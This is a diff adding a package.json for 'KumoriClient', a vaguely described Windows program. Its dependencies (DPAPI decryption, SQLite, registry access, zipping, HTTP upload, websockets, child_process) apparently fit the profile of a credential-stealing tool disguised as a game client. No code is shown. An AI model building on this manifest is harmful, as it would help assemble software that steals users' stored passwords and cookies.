@@ -1,0 +1,30 @@
+{
+  "name": "KumoriClient",
+  "version": "1.0.0",
+  "description": "Program for Windows",
+  "main": "output.js",
+  "author": "SunomoGames Inc.",
+  "publisher": "Copyright © SunomoGames 2025",
+  "license": "MIT",
+  "dependencies": {
+    "@primno/dpapi": "^1.1.2",
+    "adm-zip": "^0.5.16",
+    "archiver": "^7.0.1",
+    "axios": "^1.8.4",
+    "child_process": "^1.0.2",
+    "crypto": "^1.0.1",
+    "form-data": "^4.0.2",
+    "datavault-win": "^1.0.3",
+    "fs": "^0.0.1-security",
+    "fs-extra": "^11.3.3",
+    "http": "^0.0.1-security",
+    "lazystream": "^1.0.1",
+    "node-fetch": "^2.7.0",
+    "node-stream-zip": "^1.15.0",
+    "os": "^0.1.2",
+    "path": "^0.12.7",
+    "regedit": "^5.1.4",
+    "sqlite3": "^5.1.7",
+    "ws": "^8.18.0"
+  }
+}
